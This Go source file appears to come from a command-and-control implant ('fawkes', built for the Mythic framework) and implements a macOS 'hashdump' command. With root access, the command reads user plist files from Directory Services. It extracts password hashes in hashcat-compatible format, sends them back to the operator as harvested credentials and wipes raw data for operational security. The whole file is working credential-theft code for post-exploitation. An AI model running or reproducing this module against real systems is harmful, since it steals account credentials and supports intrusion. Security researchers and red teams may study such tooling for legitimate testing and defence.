//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// HashdumpCommand extracts password hashes from macOS Directory Services.
type HashdumpCommand struct{}

func (c *HashdumpCommand) Name() string { return "hashdump" }
func (c *HashdumpCommand) Description() string {
	return "Extract password hashes from macOS Directory Services (requires root)"
}

type hashdumpDarwinArgs struct {
	Format string `json:"format"` // text (default) or json
}

const dsLocalUsersPath = "/var/db/dslocal/nodes/Default/users"

func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
	var args hashdumpDarwinArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Error parsing parameters: %v", err)
		}
	}

	entries, err := extractDarwinHashes()
	if err != nil {
		return errorf("Error: %v", err)
	}

	if len(entries) == 0 {
		return successResult("No password hashes found in Directory Services")
	}

	if strings.ToLower(args.Format) == "json" {
		data, _ := json.Marshal(entries)
		return successResult(string(data))
	}

	// Text format — hashcat-compatible $ml$ format
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Dumping macOS Directory Services — %d hashes found\n\n", len(entries)))

	var creds []structs.MythicCredential

	for _, e := range entries {
		hashStr := formatDarwinHash(e)
		sb.WriteString(fmt.Sprintf("%s:%s\n", e.Username, hashStr))
		if e.UID != "" || e.Shell != "" {
			sb.WriteString(fmt.Sprintf("  UID=%s GID=%s Home=%s Shell=%s Type=%s\n",
				e.UID, e.GID, e.Home, e.Shell, e.HashType))
		}

		creds = append(creds, structs.MythicCredential{
			CredentialType: "hash",
			Realm:          "local",
			Account:        e.Username,
			Credential:     hashStr,
			Comment:        fmt.Sprintf("hashdump macOS (%s)", e.HashType),
		})
	}

	result := structs.CommandResult{
		Output:      sb.String(),
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
	return result
}

// extractDarwinHashes reads user plist files from Directory Services.
func extractDarwinHashes() ([]darwinHashEntry, error) {
	entries, err := os.ReadDir(dsLocalUsersPath)
	if err != nil {
		return nil, fmt.Errorf("reading %s: %v (requires root)", dsLocalUsersPath, err)
	}

	var results []darwinHashEntry
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".plist") {
			continue
		}

		username := strings.TrimSuffix(entry.Name(), ".plist")
		if isSystemAccount(username) {
			continue
		}

		path := filepath.Join(dsLocalUsersPath, entry.Name())
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		hashEntry, err := parseDarwinUserPlist(username, data)
		structs.ZeroBytes(data) // opsec: clear raw plist data
		if err != nil {
			continue
		}
		if hashEntry != nil {
			results = append(results, *hashEntry)
		}
	}

	return results, nil
}
